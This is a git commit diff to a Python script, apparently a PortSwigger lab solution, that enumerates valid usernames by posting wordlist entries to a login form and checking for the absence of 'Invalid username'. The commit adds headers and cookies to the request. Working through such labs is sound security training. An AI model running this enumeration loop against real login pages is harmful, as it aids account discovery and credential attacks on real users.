e183243809c6f3aa051142c37938bc53afe09f16
Michael George <michael.g.george@gmail.com>
2022-11-02 04:17:31 +0530

    Modify user_enum in username_diff_res, script, auth
    Added headers and cookies to post request.

--- portswigger/auth/username_diff_res/script.py
+++ portswigger/auth/username_diff_res/script.py
@@ -10,9 +10,15 @@ def user_enum(url, user_file_list, headers, cookies):
     with Path(user_file_list).open('r') as file:
         lines = file.readlines()
         for line in lines:
-            res = post(url=url, data={'username': line, 'password': 'asdf'})
+            res = post(
+                url=url, 
+                data={'username': line, 'password': 'asdf'},
+                headers=headers,
+                cookies=cookies
+            )
             if 'Invalid username' not in res.text:
                 return line
 
 def pass_enum():
     pass
+
